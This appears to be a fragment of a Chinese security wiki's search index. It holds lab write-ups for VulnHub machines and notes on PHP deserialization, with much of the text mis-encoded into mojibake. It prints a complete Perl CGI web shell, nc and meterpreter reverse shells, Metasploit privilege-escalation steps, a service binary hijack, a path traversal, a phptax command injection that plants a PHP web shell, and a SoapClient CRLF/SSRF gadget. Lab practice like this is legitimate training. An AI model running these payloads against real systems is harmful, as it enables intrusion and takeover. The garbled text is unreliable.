Scream","path":"/wiki/WP/Windowsææƒ/vulnhub/devrandom Scream.html","content":"å‰ækali IP 192.168.129.152 windows xp è®¾ç½®æˆNATæ¨¡å¼ ä¿¡æ¯æ”¶é›†æ‰«æipnmap -sP 192.168.129.024 ç›®æ ‡åº”è¯¥å°±æ˜¯ 192.168.129.163äº† æ‰«æç«¯å£ masscan 192.168.129.163 -p1-65535 â€“rate 100000 æ‰«å‡ºæ¥ 21ï¼Œ22ï¼Œ23ï¼Œ80ç«¯å£ nmap -sT -sV -Pn -v 192.168.129.163 -p 21,22,23,80 FTPnmap -sT -sV -Pn -v 192.168.129.163 -p 21,22,23,80 -A å°è¯•åŒ¿åç™»å½•åº”è¯¥æ˜¯ä¸‹é¢ææƒé‚£å—ï¼Œæ”¹æœåŠ¡å¯¼è‡´è¿ä¸ä¸Šftp è¡¨æ˜å¯èƒ½æ­£åœ¨è¿è¡Œ TFTP æœåŠ¡ æ‰«æudpnmap -sU -p- 192.168.129.163 tftp 192.163.129.163 putæ–‡ä»¶ï¼Œåœ¨æµè§ˆå™¨è®¿é—®ï¼Œçœ‹æ˜¯å¦æˆåŠŸ ç½‘é¡µè¢«æˆ‘ææŒ‚æ‰äº† ä½†ç¡®å®èƒ½è®¿é—®æˆåŠŸ ç„¶åé€šè¿‡ftpåŒ¿åç™»å½•ï¼Œå¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ªcgi-bin,å¯ä»¥å°è¯•ä¸Šä¼ è¿™ç±»æœ¨é©¬ ssh æ¸—é€æµ‹è¯•cgi-binè§£é‡ŠCGI ä»£è¡¨ é€šç”¨ç½‘å…³æ¥å£ã€‚â€Binâ€ æ˜¯ binaryï¼ˆäºŒè¿›åˆ¶ï¼‰ çš„ç¼©å†™ - ç»å¸¸ç”¨æ¥æŒ‡ä»£å¯æ‰§è¡Œæ–‡ä»¶æˆ–è„šæœ¬ã€‚ cgi-bin ç›®å½•æ˜¯ç½‘ç«™å¼€å‘è€…æ”¾ç½®å¯æ‰§è¡Œæ–‡ä»¶çš„åœ°æ–¹ï¼Œè¿™æ ·ä»–ä»¬çš„ç½‘ç«™å°±èƒ½æ‹¥æœ‰æ¯”çº¯ HTML æ›´å¤šçš„åŠŸèƒ½ã€‚ ä¸»æµçš„CGIç¨‹åºç”¨Perlç¼–å†™ ä¸Šä¼ perl æœ¨é©¬,è™½ç„¶ç•Œé¢ä¹±ç ï¼Œä½†ä¸å½±å“ä½¿ç”¨#!/usr/bin/perluse strict;use warnings;use CGI;use Cwd;print CGI::header(-type = text/html);my $query = new CGI;my $command = $query-param(command) || ;my $pwd = $query-param(pwd) || ;my $password = $query-param(password)|| ;my $filename = $query-script_name();# å¯†ç éªŒè¯if ($password ne yourpassword) print è¯·æä¾›æœ‰æ•ˆçš„å¯†ç  ; exit(0);# å¤„ç†å½“å‰ç›®å½•$pwd = `pwd` unless $pwd;chomp($pwd); # ç§»é™¤æœ«å°¾æ¢è¡Œç¬¦eval chdir($pwd) ;my $result = ;# æ‰§è¡Œå‘½ä»¤if ($command =~ /^cd\\s+(.+)$/) my $new_dir = $1; eval chdir($new_dir) ; $pwd = Cwd::cwd(); $result = `ls -la 21`; elsif ($command =~ /^cd\\s*$/) chdir($ENVHOME); $pwd = Cwd::cwd(); $result = `ls -la 21`; elsif ($command) $result = `$command 21`;# HTMLè¾“å‡ºprint qq!DOCTYPE htmlhtmlheadmeta charset=utf-8titleç½‘é¡µæ§åˆ¶å°/titlescriptwindow.onload = function() document.getElementById(command).focus();;/scriptstyle type=text/css.wide1 border: 2px solid #ccc; width: 98%; height: 400px; font-family: monospace; padding: 10px;.wide2 border: 2px solid #ccc; width: 70%; padding: 5px;.container margin: 20px;.info background-color: #f0f0f0; padding: 10px; margin-bottom: 10px;/style/headbodydiv class=container div class=info è„šæœ¬: $filename | å½“å‰ç›®å½•: $pwd /div pre class=wide1$result/pre form method=post action=$filename name=cmdForm label for=commandå‘½ä»¤:/label input class=wide2 name=command id=command autocomplete=off input type=submit value=æ‰§è¡Œ brbr input name=password value=$password type=hidden input name=pwd value=$pwd type=hidden /form/div/body/html;exit 0; æƒé™æå‡åå¼¹shell1.PowerCat.ps1(å¤±è´¥)é¶æœºæ˜¯ Windows XP ç²¾ç®€ç‰ˆ æˆ–è€… è€ IIS ç¯å¢ƒï¼Œç³»ç»Ÿç›®å½•é‡Œ æ²¡æœ‰ powershell.exe 2.nc.exetftp ä¸Šä¼ 32ä½nc.exe wget https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip unzip netcat-win32-1.11.zip cd netcat-1.11 tftp 192.168.129.163 binary å¿…é¡»å°†ä¼ è¾“æ¨¡å¼åˆ‡æ¢ä¸ºfont style=color:#DF2A3F;background-color:rgb(249, 242, 244);binary/fontï¼Œå¦åˆ™TFTPä¼šä¸Šä¼ çº¯æ–‡æœ¬ put nc.exe cgi-binnc.exe ç½‘é¡µç«¯æŸ¥çœ‹æ˜¯å¦ä¸Šä¼ æˆåŠŸ æˆåŠŸä¸Šä¼  kaliç›‘å¬nc -lvp 5555 ç½‘é¡µç«¯æ‰§è¡Œå‘½ä»¤nc -nv 192.168.129.152 5555 -e C:\\Windows\\System32\\cmd.exe 3.msfç”Ÿæˆæœ¨é©¬æ–‡ä»¶msfvenom -p windoesmeterpreterreverse_tcp LHOST192.168.129.152 LPORT5555 -f exe -o shell.exe tftpä¸Šä¼ åˆ°windows xpput shell.exe cgi-binshell.exe msf ç›‘å¬ç«¯å£use exploitmultihandler set payload windowsmeterpreterreverse_tcp set lport 5555 set lhost 192.168.129.152 ç½‘é¡µç«¯è¿è¡Œstart .\\shell.exe å†…æ ¸ææƒmsfè‡ªåŠ¨æŸ¥æ‰¾åˆ©ç”¨ä¹‹å‰åå¼¹çš„shellbg(æŠŠä¼šè¯æ”¾è¿›åç«¯) use postmultireconlocal_exploit_suggester(å…¨è‡ªåŠ¨) set session 2 (å› ä¸ºåå¼¹çš„shellæç¤ºä¼šè¯æ˜¯2) run æŸ¥æ‰¾å¯åˆ©ç”¨çš„ç‚¹ï¼Œç»¿è‰²çš„éƒ½å¯ä»¥è¯•è¯•use exploitwindowslocalms10_015_kitrap0d set session 2 set lhost 192.168.129.152 set lport 6666 msf å¦å¤–å¼€ä¸ªçª—å£ç›‘å¬ run ä¸‹é¢å¥½å‡ ä¸ªéƒ½å¯ä»¥ç”¨ï¼Œæœ‰ä¸€ä¸ªå°±å¯ä»¥ æ‰‹å·¥(æ‰€æœ‰è‡ªåŠ¨æ–¹æ³•ä¸è¡Œçš„è¯ï¼Œæœ€åå†æ‰‹å·¥ï¼Œæé«˜æ•ˆç‡)é”™è¯¯çš„ç³»ç»Ÿé…ç½®å·¥å…·ä¼ é€ winpeas ï¼Œaccesschktftp put winPEASx86.exe cgi-binwinPEASx86.exe å…ˆncåå¼¹shell winPEASæ£€æŸ¥æœåŠ¡é…ç½®é”™è¯¯.\\winPEASx86.exe quiet servicesinfo å¡ä½äº†ï¼Œåº”è¯¥æ˜¯ç³»ç»Ÿå¤ªè€äº†ï¼Œè·³è¿‡ msfå‰æ:å…ˆæœ‰ä¸€ä¸ªåå¼¹shelluse exploitwindowslocalservice_permissionsset session 1 å¦å¤–ä¸€ä¸ªmsfçª—å£ç›‘å¬ å¤±è´¥ï¼Œæ¢ä¸€ä¸ª use exploitwindowslocalunquoted_service_path å¤±è´¥ æ‰‹å·¥æŸ¥çœ‹ç³»ç»Ÿè¿›ç¨‹tasklist FI â€œusername eq SYSTEMâ€ è¿™å‡ ä¸ªéƒ½æ˜¯ç³»ç»Ÿè¿›ç¨‹ï¼Œå°è¯•èƒ½ä¸èƒ½åœæ­¢è¿›ç¨‹ æŸ¥çœ‹æœåŠ¡net start é€‰è¿™ä¸ªæ˜¯å› ä¸ºä¸å½±å“ç³»ç»ŸæœåŠ¡ net stop â€œFileZilla Server FTP serverâ€ æˆåŠŸï¼Œç„¶åæŸ¥æ‰¾æœåŠ¡è·¯å¾„cd C:\\ dir â€œFileZilla Server FTP serverâ€ s b è¿›å…¥ç›®å½•ï¼Œé€šè¿‡tftp binaryæ¨¡å¼ä¸Šä¼ msfç”Ÿæˆçš„æœ¨é©¬ï¼Œç„¶åä¸Šä¼ åˆ°å¯¹åº”ç›®å½•msfvenom -p windoesmeterpreterreverse_tcp LHOST192.168.129.152 LPORT4444 -f exe -o xx.exe å…ˆåœæ­¢æœåŠ¡ï¼Œç„¶åæŠŠå¯¹åº”æ–‡ä»¶å¤‡ä»½ï¼ŒæŠŠæœ¨é©¬æ¢æˆå¯¹åº”æ–‡ä»¶è¯­æ³• move â€œâ€œ â€œâ€œ æ³¨æ„ msf ç”Ÿæˆçš„æœ¨é©¬ï¼Œå¾—åˆ†æƒ…å†µèƒ½ä¸èƒ½ç”¨ncåå¼¹shell Payload ç±»å‹ èƒ½å¦ç”¨ NC æ¥æ”¶ å¤‡æ³¨ font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);linux/x86/shell_reverse_tcp/font âœ… Yes æ ‡å‡† reverse shell font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);windows/shell_reverse_tcp/font âœ… Yes Windows cmd shell font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);java/shell_reverse_tcp/font âœ… Yes Java reverse shell font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);php/reverse_php/font âœ… Yes PHP reverse shell font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);meterpreter/reverse_tcp/font âŒ No éœ€è¦ MSF handler font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);staged/*/font âŒ No éœ€è¦ stager font style=color:rgba(0, 0, 0, 0.88);background-color:rgba(175, 184, 193, 0.2);bind_tcp/font variants âœ… Yes éœ€ä¸»åŠ¨è¿æ¥ç›®æ ‡ å¯åŠ¨æœåŠ¡å‰ï¼Œmsfå…ˆç›‘å¬çª—å£å¯åŠ¨æœåŠ¡ è¿˜æ˜¯è¿›ç¨‹è¿ç§»ä¸€ä¸‹ï¼Œä¸ç„¶ä¼šæ–­ ç»„ç­–ç•¥postwindowsgathercredentialsgppset session 1 å¤±è´¥ ä»¤ç‰Œçªƒå–ç›´æ¥å°è¯• getsystemæˆåŠŸ è·å–å¯†ç "},{"title":"é€»è¾‘è¶Šæƒ","path":"/wiki/WebçŸ¥è¯†ç‚¹/é€»è¾‘è¶Šæƒ/index.html","content":"æŒ–æ˜æµç¨‹ ç‚¹å‡»é˜…è¯»è¯¦ç»†å†…å®¹... ğŸ“ æ–‡æ¡£ è¶Šæƒ ç‚¹å‡»é˜…è¯»è¯¦ç»†å†…å®¹... ğŸ“ æ–‡æ¡£"},{"title":"Kioptrix_2014(#5)","path":"/wiki/WP/Windowsææƒ/vulnhub/Kioptrix_2014(#5).html","content":"Kioptrix: 2014 (#5)å‰ækali ip 192.168.129.152ä¿¡æ¯æ”¶é›†ipæ”¶é›†nmap -sP 192.168.129.024 ç«¯å£æ”¶é›†nmap -sT -sV -Pn -v 192.168.129.164 -p- -A æ‰«æåˆ° 22ï¼Œ80ï¼Œ8080ï¼Œ ä½†æ˜¯22ç«¯å£å…³é—­äº† çœ‹çœ‹udp ç«¯å£ nmap -sU -p- 192.168.129.164 æ—  æ¸—é€æµ‹è¯•80ç«¯å£ æ£€æŸ¥æºä»£ç  è®¿é—® eholeæ‰«ææŒ‡çº¹ Apache,FreeBSD,mod_ssl,mod_dav, | Apache2.2.21 (FreeBSD) mod_ssl2.2.21 OpenSSL0.9.8q DAV2 PHP5.3.8 æ‰«ç§’æ˜¯å¦æœ‰æ¼æ´ æŸ¥çœ‹å†…å®¹ç›®å½•ç©¿è¶Šhttp://192.168.129.164/pChart2.1.3/examples/index.php?Action=ViewScript=%2f..%2f..%2fetc/passwd æœ‰ä¸‰ä¸ªç”¨æˆ·ï¼Œä½†éƒ½ä¸èƒ½ç™»å½•ï¼Œå°è¯•å†…æ ¸æ¼æ´ etcshadow æ²¡æœ‰æƒé™ å¯ä»¥æŸ¥çœ‹apacheçš„é…ç½®http://192.168.129.164/pChart2.1.3/examples/index.php?Action=ViewScript=%2f..%2f..%2fusr/local/etc/apache22/httpd.conf åªå…è®¸Mozilla4_browser æ›¿æ¢ä¸€ä¸‹ ä½¿ç”¨è¿™ä¸ªæ’ä»¶ï¼Œè‡ªå®šä¹‰ User-Agent :Mozilla4.0 ä½†æ˜¯æ„Ÿè§‰ä¸å¤ªå¥½ç”¨ï¼Œé»˜è®¤çš„è¯ï¼Œæµè§ˆå™¨ä¸èƒ½ç”¨ è¿˜æ˜¯ç”¨BPå§ æœä¸€ä¸‹æ˜¯ä»€ä¹ˆï¼Œå¤§æ¦‚æ˜¯cms æœ‰msfæ¨¡å—ï¼Œç›´æ¥ç”¨ å¤±è´¥ ç¿»çœ‹åˆ«äººç¬”è®°ï¼ŒåŸæ¥æ˜¯æ²¡æœ‰è®¾ç½®payload æœ€é‡è¦çš„ä¸€ç‚¹ï¼Œæ²¡æœ‰è®¾ç½®ua show advanced å¯ä»¥æŸ¥çœ‹è¯¦ç»†å†…å®¹ æ‰‹å·¥å°è¯• exploitdb æ˜¾ç¤º å¯ä»¥æœ‰ä¸¤ä¸ªæ–¹æ³• å°è¯•è¾“å…¥ä¸€å¥è¯æœ¨é©¬ http://192.168.129.164:8080/phptax/drawimage.php?pfilez=xxx;echo%20%27%3C?php%20echo%20system($_GET[%22cmd%22])%20?%3E%27%20%3E%202.php;pdfmake çœ‹çœ‹æˆåŠŸæ²¡æœ‰ å¯ä»¥æ‰§è¡Œå‘½ä»¤äº†ï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆï¼Œè¿æ¥èšå‰‘è¿ä¸ä¸Š èšå‰‘è¿ä¸ä¸ŠåŸå› :å¾—ç”¨é€‚ç”¨åˆé€‚çš„ä¸€å¥è¯æœ¨é©¬è¿™æ ·æ‰èƒ½è¿ä¸Š xsshttp://192.168.129.164/pChart2.1.3/examples/sandbox/script/session.php?%3Cscript%3Ealert(%27XSS%27)%3C/script%3E ä½†å¯¹ææƒä½œç”¨ä¸å¤§ 8080ç«¯å£ ç¦æ­¢è®¿é—® æƒé™æå‡æœç´¢æ¼æ´ searchsploit FreeBSD 9.0 28718.cæ²¡æœ‰æˆåŠŸï¼Œå°è¯•263è¿™ä¸ª ç³»ç»Ÿé‡Œåªæœ‰nc å’Œgcc kali å‘é€æ–‡ä»¶ nc -lvp 555526368.cå®¢æˆ·æœºæ¥å—æ–‡ä»¶ nc 192.168.129.152 5555 111.cç¼–è¯‘ï¼Œæ‰§è¡Œ è·å–ä¿¡æ¯ æ€»ç»“ ç¬¬ä¸€æ¬¡ç”¨searchsploit ä¸å¤ªç†Ÿç»ƒï¼Œè¿˜å¾—å¤šç”¨ï¼Œè‹±æ–‡è¿˜å¾—å¥½å¥½çœ‹ ä¸­å›½èšå‰‘è¿æ¥é—®é¢˜ ï¼šå¾—ç”¨ç›¸åº”æœ¨é©¬ï¼Œä¸ç„¶è¿ä¸ä¸Šèšå‰‘ æ›´æ–°: 2025-11-20 17:01:35åŸæ–‡: https://www.yuque.com/zhuoyibeiqingcha-cndti/miwngn/dgctw8y0ze7pbpbb"},{"title":"vulnhub","path":"/wiki/WP/Windowsææƒ/vulnhub/index.html","content":"devrandom Scream ç‚¹å‡»é˜…è¯»è¯¦ç»†å†…å®¹... ğŸ“ æ–‡æ¡£ GeminiInc v1 ç‚¹å‡»é˜…è¯»è¯¦ç»†å†…å®¹... ğŸ“ æ–‡æ¡£ GeminiIncv1 ç‚¹å‡»é˜…è¯»è¯¦ç»†å†…å®¹... ğŸ“ æ–‡æ¡£ Kioptrix 2014 (#5) ç‚¹å‡»é˜…è¯»è¯¦ç»†å†…å®¹... ğŸ“ æ–‡æ¡£ Kioptrix_2014(#5) ç‚¹å‡»é˜…è¯»è¯¦ç»†å†…å®¹... ğŸ“ æ–‡æ¡£ Toppo ç‚¹å‡»é˜…è¯»è¯¦ç»†å†…å®¹... ğŸ“ æ–‡æ¡£ _dev_random_Scream ç‚¹å‡»é˜…è¯»è¯¦ç»†å†…å®¹... ğŸ“ æ–‡æ¡£"},{"title":"Deserialization + __call + SoapClient + CRLF = SSRF","path":"/wiki/WP/ååºåˆ—åŒ–/php/Deserialization + __call + SoapClient + CRLF = SSRF.html","content":"phpä¸­çš„å†…ç½®ç±»?php$classes = get_declared_classes();foreach ($classes as $class) $methods = get_class_methods($class); foreach ($methods as $method) if (in_array($method, array( __destruct, __toString, __wakeup, __call, __callStatic, __get, __set, __isset, __unset, __invoke, __set_state ))) print $class . :: . $method . ; é¦–å…ˆæµ‹è¯•ä¸‹æ­£å¸¸æƒ…å†µä¸‹çš„SoapClientç±»ï¼Œè°ƒç”¨ä¸€ä¸ªä¸å­˜åœ¨çš„å‡½æ•°ï¼Œä¼šå»è°ƒç”¨__callæ–¹æ³• ?php$a = new SoapClient(null,array(uri=bbb, location=http://127.0.0.1:5555/path));$b = serialize($a);echo $b;$c = unserialize($b);$c-not_exists_function(); CRLFæ¼æ´ä»ä¸Šå›¾å¯ä»¥çœ‹åˆ°ï¼ŒSOAPActionå¤„å¯æ§ï¼Œå¯ä»¥æŠŠ\\x0d\\x0aæ³¨å…¥åˆ°SOAPActionï¼ŒPOSTè¯·æ±‚çš„headerå°±å¯ä»¥è¢«æ§åˆ¶ ?php$a = new SoapClient(null,array(uri=bbb\\r \\r ccc\\r , location=http://127.0.0.1:5555/path));$b = serialize($a);echo $b;$c = unserialize($b);$c-not_exists_function(); ä½†Content-Typeåœ¨SOAPActionçš„ä¸Šé¢ï¼Œå°±æ— æ³•æ§åˆ¶Content-Typ,ä¹Ÿå°±ä¸èƒ½æ§åˆ¶POSTçš„æ•°æ® åœ¨headeré‡ŒUser-Agentåœ¨Content-Typeå‰é¢ https://www.php.net/manual/zh/soapclient.soapclient.php : The user_agent option specifies string to use in User-Agent header. user_agentåŒæ ·å¯ä»¥æ³¨å…¥CRLFï¼Œæ§åˆ¶Content-Typeçš„å€¼ wupco ?php$target = http://127.0.0.1:5555/path;$post_string = data=something;$headers = array( X-Forwarded-For: 127.0.0.1, Cookie: PHPSESSID=my_session );$b = new SoapClient(null,array(location = $target,user_agent=wupco^^Content-Type: application/x-www-form-urlencoded^^.join(^^,$headers).^^Content-Length: .(string)strlen($post_string).^^^^.$post_string,uri = aaab));$aaa = serialize($b);$aaa = str_replace(^^,\\r ,$aaa);$aaa = str_replace(,,$aaa);echo $aaa;$c = unserialize($aaa);$c-not_exists_function();?"},{"title":"php","path":"/wiki/WP/ååºåˆ—åŒ–/php/index.html","content":"Deserialization + __call + SoapClient + CRLF = SSRF ç‚¹å‡»é˜…è¯»è¯¦ç»†å†…å®¹... ğŸ“ æ–‡æ¡£ Deserialization+__call+SoapClient+CRLF=SSRF ç‚¹å‡»é˜…è¯»è¯¦ç»†å†…å®¹... ğŸ“ æ–‡æ¡£ phpååºåˆ—åŒ– ç‚¹å‡»é˜…è¯»è¯¦ç»†å†…å®¹... ğŸ“ æ–‡æ¡£ sessionååºåˆ—åŒ– ç‚¹å‡»é˜…è¯»è¯¦ç»†å†…å®¹... ğŸ“ æ–‡æ¡£ _Laravelååºåˆ—åŒ– ç‚¹å‡»é˜…è¯»è¯¦ç»†å†…å®¹... ğŸ“ æ–‡æ¡£ _thinkPHPååºåˆ—åŒ– ç‚¹å‡»é˜…è¯»è¯¦ç»†å†…å®¹... ğŸ“ æ–‡æ¡£ _yiiååºåˆ—åŒ– ç‚¹å‡»é˜…è¯»è¯¦ç»†å†…å®¹... ğŸ“ æ–‡æ¡£ çŸ¥è¯†ç‚¹ ç‚¹å‡»é˜…è¯»è¯¦ç»†å†…å®¹... ğŸ“ æ–‡æ¡£"},{"title":"sessionååºåˆ—åŒ–","path":"/wiki/WP/ååºåˆ—åŒ–/php/sessionååºåˆ—åŒ–.html","content":"sessionååºåˆ—åŒ– æ›´æ–°: 2025-09-06 15:37:25åŸæ–‡: https://www.yuque.com/zhuoyibeiqingcha-cndti/miwngn/78157cec2e797685db5247bd8ba41e31"},{"title":"Deserialization+__call+SoapClient+CRLF=SSRF","path":"/wiki/WP/ååºåˆ—åŒ–/php/Deserialization+__call+SoapClient+CRLF=SSRF.html","content":"Deserialization + __call + SoapClient + CRLF SSRFphpä¸­çš„å†…ç½®ç±»?php$classes = get_declared_classes();foreach ($classes as $class) $methods = get_class_methods($class); foreach ($methods as $method) if (in_array($method, array( __destruct, __toString, __wakeup, __call, __callStatic, __get, __set, __isset, __unset, __invoke, __set_state ))) print $class . :: . $method . ; é¦–å…ˆæµ‹è¯•ä¸‹æ­£å¸¸æƒ…å†µä¸‹çš„SoapClientç±»ï¼Œè°ƒç”¨ä¸€ä¸ªä¸å­˜åœ¨çš„å‡½æ•°ï¼Œä¼šå»è°ƒç”¨__callæ–¹æ³• ?php$a = new SoapClient(null,array(uri=bbb, location=http://127.0.0.1:5555/path));$b = serialize($a);echo $b;$c = unserialize($b);$c-not_exists_function(); CRLFæ¼æ´ä»ä¸Šå›¾å¯ä»¥çœ‹åˆ°ï¼ŒSOAPActionå¤„å¯æ§ï¼Œå¯ä»¥æŠŠ\\x0d\\x0aæ³¨å…¥åˆ°SOAPActionï¼ŒPOSTè¯·æ±‚çš„headerå°±å¯ä»¥è¢«æ§åˆ¶ ?php$a = new SoapClient(null,array(uri=bbb\\r \\r ccc\\r , location=http://127.0.0.1:5555/path));$b = serialize($a);echo $b;$c = unserialize($b);$c-not_exists_function(); ä½†Content-Typeåœ¨SOAPActionçš„ä¸Šé¢ï¼Œå°±æ— æ³•æ§åˆ¶Content-Typ,ä¹Ÿå°±ä¸èƒ½æ§åˆ¶POSTçš„æ•°æ® åœ¨headeré‡ŒUser-Agentåœ¨Content-Typeå‰é¢ https://www.php.net/manual/zh/soapclient.soapclient.php : The user_agent option specifies string to use in User-Agent header. user_agentåŒæ ·å¯ä»¥æ³¨å…¥CRLFï¼Œæ§åˆ¶Content-Typeçš„å€¼ wupco ?php$target = http://127.0.0.1:5555/path;$post_string = data=something;$headers = array( X-Forwarded-For: 127.0.0.1, Cookie: PHPSESSID=my_session );$b = new SoapClient(null,array(location = $target,user_agent=wupco^^Content-Type: application/x-www-form-urlencoded^^.join(^^,$headers).^^Content-Length: .(string)strlen($post_string).^^^^.$post_string,uri = aaab));$aaa = serialize($b);$aaa = str_replace(^^,\\r ,$aaa);$aaa = str_replace(,,$aaa);echo $aaa;$c = unserialize($aaa);$c-not_exists_function();? æ›´æ–°: 2025-09-06 15:37:18åŸæ–‡: https://www.yuque.com/zhuoyibeiqingcha-cndti/miwngn/1114302a1ccda5dfe94a4e12f96ee905"},{"title":"çŸ¥è¯†ç‚¹","path":"/wiki/WP/ååºåˆ—åŒ–/php/çŸ¥è¯†ç‚¹.html","content":"é­”æœ¯æ–¹æ³•__wakeup() //ä½¿ç”¨unserializeæ—¶è§¦å‘__sleep() //ä½¿ç”¨serializeæ—¶è§¦å‘__destruct() //å¯¹è±¡è¢«é”€æ¯æ—¶è§¦å‘__call() //åœ¨å¯¹è±¡ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘__callStatic() //åœ¨é™æ€ä¸Šä¸‹æ–‡ä¸­è°ƒç”¨ä¸å¯è®¿é—®çš„æ–¹æ³•æ—¶è§¦å‘__get() //ç”¨äºä»ä¸å¯è®¿é—®çš„å±æ€§è¯»å–æ•°æ®__set() //ç”¨äºå°†æ•°æ®å†™å…¥ä¸å¯è®¿é—®çš„å±æ€§__isset() //åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šè°ƒç”¨isset()æˆ–empty()è§¦å‘__unset() //åœ¨ä¸å¯è®¿é—®çš„å±æ€§ä¸Šä½¿ç”¨unset()æ—¶è§¦å‘__toString() //æŠŠç±»å½“ä½œå­—ç¬¦ä¸²ä½¿ç”¨æ—¶è§¦å‘__invoke() //å½“è„šæœ¬å°è¯•å°†å¯¹è±¡è°ƒç”¨ä¸ºå‡½æ•°æ—¶è§¦å‘ å¸¸è§„æ¼æ´__WAKEUPå°†åœ¨åºåˆ—åŒ–ä¹‹åç«‹å³è¢«è°ƒç”¨,å½“åºåˆ—åŒ–å­—ç¬¦ä¸²è¡¨ç¤ºå¯¹è±¡å±æ€§ä¸ªæ•°çš„æ•°å­—å€¼å¤§äºçœŸå®ç±»ä¸­å±æ€§çš„ä¸ªæ•°æ—¶å°±ä¼šè·³è¿‡__wakeupçš„æ‰§è¡Œã€‚ __DESTRUCTPHPä¸­SESSIONååºåˆ—åŒ–ï¼ˆé‡ç‚¹ï¼‰ç®€ä»‹ä¸åŸºç¡€çŸ¥è¯†åœ¨php.iniä¸­å­˜åœ¨ä¸‰é¡¹é…ç½®é¡¹ï¼š session.save_path= â€“è®¾ç½®sessionçš„å­˜å‚¨è·¯å¾„ session.save_handler= â€“è®¾å®šç”¨æˆ·è‡ªå®šä¹‰sessionå­˜å‚¨å‡½æ•°ï¼Œå¦‚æœæƒ³ä½¿ç”¨PHPå†…ç½®ä¼šè¯å­˜å‚¨æœºåˆ¶ä¹‹å¤–çš„å¯ä»¥ä½¿ç”¨æœ¬å‡½æ•°(æ•°æ®åº“ç­‰æ–¹å¼) session.auto_start boolen â€“æŒ‡å®šä¼šè¯æ¨¡å—æ˜¯å¦åœ¨è¯·æ±‚å¼€å§‹æ—¶å¯åŠ¨ä¸€ä¸ªä¼šè¯ï¼Œé»˜è®¤ä¸º0ä¸å¯åŠ¨ session.serialize_handler string â€“å®šä¹‰ç”¨æ¥åºåˆ—åŒ–ååºåˆ—åŒ–çš„å¤„ç†å™¨åå­—ã€‚é»˜è®¤ä½¿ç”¨php (php5.5.4) ä»¥ä¸Šçš„é€‰é¡¹å°±æ˜¯ä¸PHPä¸­çš„Session å­˜å‚¨ å’Œ åºåˆ—åŒ–å­˜å‚¨ æœ‰å…³çš„é€‰é¡¹ã€‚ åœ¨ä½¿ç”¨xamppç»„ä»¶å®‰è£…ä¸­ï¼Œä¸Šè¿°çš„é…ç½®é¡¹çš„è®¾ç½®å¦‚ä¸‹ï¼š session.save_path=D:\\xampp\\tmp è¡¨æ˜æ‰€æœ‰çš„sessionæ–‡ä»¶éƒ½æ˜¯å­˜å‚¨åœ¨xampptmpä¸‹ session.save_handler=files è¡¨æ˜sessionæ˜¯ä»¥æ–‡ä»¶çš„æ–¹å¼æ¥è¿›è¡Œå­˜å‚¨çš„ session.auto_start=0 è¡¨æ˜é»˜è®¤ä¸å¯åŠ¨session session.serialize_handler=php è¡¨æ˜sessionçš„é»˜è®¤åºåˆ—åŒ–å¼•æ“ä½¿ç”¨çš„æ˜¯phpåºåˆ—è¯å¼•æ“ åœ¨ä¸Šè¿°çš„é…ç½®ä¸­ï¼Œsession.serialize_handleræ˜¯ç”¨æ¥è®¾ç½®sessionçš„åºåˆ—åŒ–å¼•æ“çš„ï¼Œé™¤äº†é»˜è®¤çš„PHPå¼•æ“ä¹‹å¤–ï¼Œè¿˜å­˜åœ¨å…¶ä»–å¼•æ“ï¼Œä¸åŒçš„å¼•æ“æ‰€å¯¹åº”çš„sessionçš„å­˜å‚¨æ–¹å¼ä¸ç›¸åŒã€‚ å¼•æ“ sessionå­˜å‚¨æ–¹å¼ php(php5.5.4) å­˜å‚¨æ–¹å¼æ˜¯ï¼Œé”®å+ç«–çº¿ php_serialize(php5.5.4) å­˜å‚¨æ–¹å¼æ˜¯ï¼Œç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„é”®å’Œå€¼ï¼ˆå°†sessionä¸­çš„keyå’Œvalueéƒ½ä¼šè¿›è¡Œåºåˆ—åŒ–ï¼‰ php_binary å­˜å‚¨æ–¹å¼æ˜¯ï¼Œé”®åçš„é•¿åº¦å¯¹åº”çš„ASCIIå­—ç¬¦+é”®å+ç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„å€¼ åœ¨PHP (php5.5.4) ä¸­é»˜è®¤ä½¿ç”¨çš„æ˜¯PHPå¼•æ“ï¼Œå¦‚æœè¦ä¿®æ”¹ä¸ºå…¶ä»–çš„å¼•æ“ï¼Œåªéœ€è¦æ·»åŠ ä»£ç ini_set(session.serialize_handler, éœ€è¦è®¾ç½®çš„å¼•æ“å);è¿›è¡Œè®¾ç½®ã€‚ ç¤ºä¾‹ä»£ç å¦‚ä¸‹ï¼š php ?phpini_set(session.serialize_handler, php_serialize); //è®¾ç½®åºåˆ—åŒ–å¼•æ“ä½¿ç”¨php_serializesession_start();// do something...... å­˜å‚¨æœºåˆ¶ 